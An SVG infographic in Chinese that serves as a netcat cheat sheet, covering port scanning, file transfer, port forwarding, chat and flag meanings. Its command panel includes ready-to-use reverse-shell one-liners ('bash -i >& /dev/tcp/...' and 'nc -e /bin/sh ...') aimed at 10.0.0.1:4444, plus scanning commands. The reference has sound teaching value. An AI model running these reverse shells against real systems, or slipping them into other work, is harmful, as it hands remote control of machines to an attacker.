<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 480" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="480" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">nc（netcat）多种使用场景</text>

  <rect x="40" y="70" width="180" height="60" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="130" y="102" font-size="10" text-anchor="middle" fill="#c53030" font-weight="bold">端口扫描</text>
  <text x="130" y="120" font-size="9" text-anchor="middle" fill="#c53030">nc -zv target port</text>

  <rect x="240" y="70" width="180" height="60" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="330" y="102" font-size="10" text-anchor="middle" fill="#b7791f" font-weight="bold">文件传输</text>
  <text x="330" y="120" font-size="9" text-anchor="middle" fill="#b7791f">nc -l port &amp; cat file | nc</text>

  <rect x="440" y="70" width="180" height="60" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="530" y="102" font-size="10" text-anchor="middle" fill="#805ad5" font-weight="bold">反弹 Shell</text>
  <text x="530" y="120" font-size="9" text-anchor="middle" fill="#805ad5">bash -i &gt;&amp; /dev/tcp/</text>

  <rect x="640" y="70" width="180" height="60" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="730" y="102" font-size="10" text-anchor="middle" fill="#38a169" font-weight="bold">端口转发</text>
  <text x="730" y="120" font-size="9" text-anchor="middle" fill="#38a169">nc -l port | nc target port</text>

  <rect x="840" y="70" width="120" height="60" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="900" y="102" font-size="10" text-anchor="middle" fill="#3182ce" font-weight="bold">Chat 工具</text>
  <text x="900" y="120" font-size="9" text-anchor="middle" fill="#3182ce">nc -l 8888</text>

  <rect x="40" y="155" width="460" height="300" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="180" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">nc 常用命令</text>

  <text x="70" y="210" font-size="10" font-weight="bold" fill="#c53030">端口扫描：</text>
  <text x="70" y="230" font-size="9" fill="#2d3748">nc -zv 192.168.1.100 80</text>
  <text x="70" y="250" font-size="9" fill="#2d3748">nc -zv 192.168.1.100 1-1024</text>

  <text x="70" y="280" font-size="10" font-weight="bold" fill="#805ad5">反弹 Shell：</text>
  <text x="70" y="300" font-size="9" fill="#2d3748">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</text>
  <text x="70" y="320" font-size="9" fill="#2d3748">nc -e /bin/sh 10.0.0.1 4444</text>

  <text x="70" y="350" font-size="10" font-weight="bold" fill="#dd6b20">文件传输：</text>
  <text x="70" y="370" font-size="9" fill="#2d3748">A: nc -l 9999 &gt; file.tar.gz</text>
  <text x="70" y="390" font-size="9" fill="#2d3748">B: nc A_IP 9999 &lt; file.tar.gz</text>

  <text x="70" y="420" font-size="10" font-weight="bold" fill="#3182ce">端口转发：</text>
  <text x="70" y="440" font-size="9" fill="#2d3748">nc -l 8080 | nc target 80</text>

  <rect x="520" y="155" width="440" height="300" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="180" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">参数说明</text>

  <text x="550" y="210" font-size="10" font-weight="bold" fill="#c53030">-l</text>
  <text x="590" y="210" font-size="9" fill="#2d3748">监听模式（server）</text>

  <text x="550" y="235" font-size="10" font-weight="bold" fill="#805ad5">-z</text>
  <text x="590" y="235" font-size="9" fill="#2d3748">扫描模式（无数据）</text>

  <text x="550" y="260" font-size="10" font-weight="bold" fill="#dd6b20">-v</text>
  <text x="590" y="260" font-size="9" fill="#2d3748">详细输出（verbose）</text>

  <text x="550" y="285" font-size="10" font-weight="bold" fill="#3182ce">-p</text>
  <text x="590" y="285" font-size="9" fill="#2d3748">指定源端口</text>

  <text x="550" y="310" font-size="10" font-weight="bold" fill="#38a169">-u</text>
  <text x="590" y="310" font-size="9" fill="#2d3748">UDP 模式</text>

  <text x="550" y="335" font-size="10" font-weight="bold" fill="#c53030">-w</text>
  <text x="590" y="335" font-size="9" fill="#2d3748">超时时间（秒）</text>

  <text x="550" y="365" font-size="10" font-weight="bold" fill="#805ad5">-e</text>
  <text x="590" y="365" font-size="9" fill="#2d3748">指定程序（反弹Shell）</text>
  <text x="590" y="385" font-size="9" fill="#2d3748">注意：nmap-nc 不支持 -e</text>

  <text x="550" y="415" font-size="10" font-weight="bold" fill="#dd6b20">-k</text>
  <text x="590" y="415" font-size="9" fill="#2d3748">保持连接（多连接监听）</text>
</svg>
